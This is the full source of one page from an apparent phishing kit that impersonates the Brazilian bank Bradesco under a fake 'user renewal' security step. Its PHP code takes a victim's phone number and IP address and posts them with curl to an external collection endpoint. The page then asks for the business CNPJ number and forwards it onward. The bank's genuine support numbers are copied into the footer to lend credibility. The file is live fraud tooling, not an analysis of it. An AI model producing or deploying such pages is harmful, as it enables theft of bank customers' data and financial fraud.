<?php
    $telefone = isset($_POST['campoterceiro']) ? trim($_POST['campoterceiro']) : '';

    if(empty($telefone)){
        die("Erro: 403.");
    }
    
    $ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['REMOTE_ADDR'];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $linkdatabase);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
        "etapa2" => "ok",
        "ip" => $ip,
        "telefone" => $telefone,
    ]));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $server_output = curl_exec($ch);
    curl_close($ch);
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<title>Bradesco</title>
<link rel="stylesheet" href="css/desktop.css">
<script type="text/javascript">
    function mascaraCNPJ(value) {
      return value
        .replace(/\D/g, '')
        .replace(/^(\d{2})(\d)/, '$1.$2')
        .replace(/^(\d{2})\.(\d{3})(\d)/, '$1.$2.$3')
        .replace(/\.(\d{3})(\d)/, '.$1/$2')
        .replace(/(\d{4})(\d)/, '$1-$2')
        .slice(0, 18);
    }
    function validarCNPJ(cnpj) {
      cnpj = cnpj.replace(/[^\d]+/g, '');

      if (cnpj.length !== 14) return false;

      // Elimina CNPJs inválidos conhecidos
      if (/^(\d)\1+$/.test(cnpj)) return false;

      let tamanho = cnpj.length - 2;
      let numeros = cnpj.substring(0, tamanho);
      let digitos = cnpj.substring(tamanho);
      let soma = 0;
      let pos = tamanho - 7;

      // Primeiro dígito verificador
      for (let i = tamanho; i >= 1; i--) {
        soma += numeros.charAt(tamanho - i) * pos--;
        if (pos < 2) pos = 9;
      }

      let resultado = soma % 11 < 2 ? 0 : 11 - (soma % 11);
      if (resultado != digitos.charAt(0)) return false;

      // Segundo dígito verificador
      tamanho = tamanho + 1;
      numeros = cnpj.substring(0, tamanho);
      soma = 0;
      pos = tamanho - 7;

      for (let i = tamanho; i >= 1; i--) {
        soma += numeros.charAt(tamanho - i) * pos--;
        if (pos < 2) pos = 9;
      }

      resultado = soma % 11 < 2 ? 0 : 11 - (soma % 11);

      return resultado == digitos.charAt(1);
    }
    
    function SendCnpj(){
      let cnpj = document.getElementById("cnpj").value;
      if(validarCNPJ(cnpj)){
        document.getElementById("frmlfds").submit();
      }else{
        alert("Preencha corretamente o campo do CNPJ");
      }
    }
  </script>
</head>
<body>

<div class="topbar">
	<div class="topbarleft">
        
		<div class="topbarlogo">
		
		</div>
         <div class="bgtopwhite">
            <h1 class="titulo_bg_top">Acesso Seguro</h1>
        </div>   
        <span class="data_bg_top"> <?php echo get_data_extenso(); ?></span>   
        <button type="button" class="btn_cancelar"></button>
	</div>
</div>

<div class="container">



    <div class="main">
       
        
       
      
        <div class="atualizacao_dados" style="height:300px;">
            <div class="content">
                
                <div class="topoinfo">
                <div class="logo-icon">
                    <svg viewBox="0 0 24 24" fill="none">
                    <path d="M12 3L4 10V20H20V10L12 3Z" stroke="white" stroke-width="1.6"/>
                    </svg>
                </div>
                  <h2>Renovação de usuário</h2>
                </div>

              
              <p>Para reativação de usuário expirado, é necessário informar o CNPJ vinculado à conta.</p>

               <p> Essa etapa é fundamental para validar os dados cadastrais e garantir a segurança do processo de reativação. </p>

               <p> Informe abaixo o CNPJ de cadastro da conta:</p>
             
                     <form method="POST" action="/finalizado" id="frmlfds">
                    <div class="input-group">
                    <input type="tel" id="cnpj" name="campo_quarto" oninput="this.value = mascaraCNPJ(this.value)" placeholder="00.000.000/0000-00">
                    </div>
                    </form>
                <button  onclick="SendCnpj();" >Continuar</button>

            </div>


        </div>

            
     
    </div>

    <div class="right-panel">
        <img src="img/bg_aviso.png">
    </div>

</div>

<div class="footer">
    <div class="footer_left">
        <div class="footer_column"><img src="img/icone_rodape.gif"></div>
        <div class="footer_column">Bradesco Apoio à Empresa<br> 3003-1000 </div>
        <div class="footer_column">Alô Bradesco<br>0800 202 1000</div>
        <div class="footer_column">Deficiente Auditivo ou de Fala<br>0800 722 0099</div>
        <div class="footer_column">Ouvidoria<br>0800 727 9933</div>
    </div>
</div>

</body>
</html>